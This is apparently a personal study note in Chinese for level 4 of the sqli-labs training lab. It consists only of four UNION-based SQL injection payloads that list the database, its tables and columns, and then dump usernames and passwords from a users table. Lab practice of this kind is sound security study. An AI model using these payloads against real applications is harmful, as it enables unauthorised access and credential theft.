---
title: "网安笔记 - .trash - sqlilabs-less04"
category: "网安笔记"
date: 2025-10-18
published: 2025-10-18
author: "Rin"
---

### payload

-1") union select 1,database(),3--+

-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

-1") union select 1,group_concat(username),group_concat(password) from users--+